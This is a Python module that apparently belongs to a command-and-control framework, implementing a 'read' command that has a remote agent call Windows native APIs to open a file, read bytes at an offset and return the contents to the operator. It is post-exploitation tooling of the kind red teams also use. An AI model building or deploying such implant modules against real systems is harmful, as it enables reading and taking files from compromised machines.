NAME = "read"
DESCRIPTION = "Read bytes from a file"
PARAMS = [
    {"name":"file_name", "description":"The file name", "type":"str"},
    {"name":"read_size", "description":"Number of bytes to read", "type":"int"},
    {"name":"byte_offset", "description":"Offset to read the file from", "type":"hex"},
]
DEPENDENCIES = ["NtOpenFile", "NtReadFile", "NtClose", "NtAllocateVirtualMemory", "NtFreeVirtualMemory"]

def function(agent_id, args, dependencies):
    from services.orders import read_from_agent
    from services.binary import align_up

    NtOpenFile = dependencies[0]
    NtReadFile = dependencies[1]
    NtClose = dependencies[2]
    NtAllocate = dependencies[3]
    NtFree = dependencies[4]

    file_name = "\\??\\" + args[0]
    read_size = args[1]
    buffer_size = align_up(read_size, 0x1000)
    byte_offset = args[2]

    ret = NtAllocate(agent_id, [buffer_size, 0x04])
    if ret["NTSTATUS"] == 0:
        buffer_ptr = ret["allocated_memory"]
        print(f"buffer_ptr = {hex(buffer_ptr)}")

        ret = NtOpenFile(agent_id, [file_name, 0xC0100000])
        if ret["NTSTATUS"] == 0:
            file_handle = ret["FILE_HANDLE"]

            ret = NtReadFile(agent_id, [file_handle, byte_offset, buffer_ptr, read_size])
            if ret["NTSTATUS"] == 0:
                data = read_from_agent(agent_id, buffer_ptr, read_size)

                retclose = NtClose(agent_id, [file_handle])
                print(f"NtClose = {hex(retclose['NTSTATUS'])}")

                retfree = NtFree(agent_id, [buffer_ptr, buffer_size])
                print(f"NtFree = {hex(retfree['NTSTATUS'])}")
                decoded = data.decode("utf-8", errors="replace")
                return {
                    "Result": "Success",
                    "Data": decoded
                }
            else:
                retclose = NtClose(agent_id, [file_handle])
                print(f"NtClose = {hex(retclose['NTSTATUS'])}")

                retfree = NtFree(agent_id, [buffer_ptr, buffer_size])
                print(f"NtFree = {hex(retfree['NTSTATUS'])}")

                return {"Result": f"Error in NtReadFile: {hex(ret['NTSTATUS'])}"}
        else:
            retfree = NtFree(agent_id, [buffer_ptr, buffer_size])
            print(f"NtFree = {hex(retfree['NTSTATUS'])}")

            return {"Result": f"Error in NtOpenFile: {hex(ret['NTSTATUS'])}"}
    else:
        return {"Result": "Failed to allocate process memory"}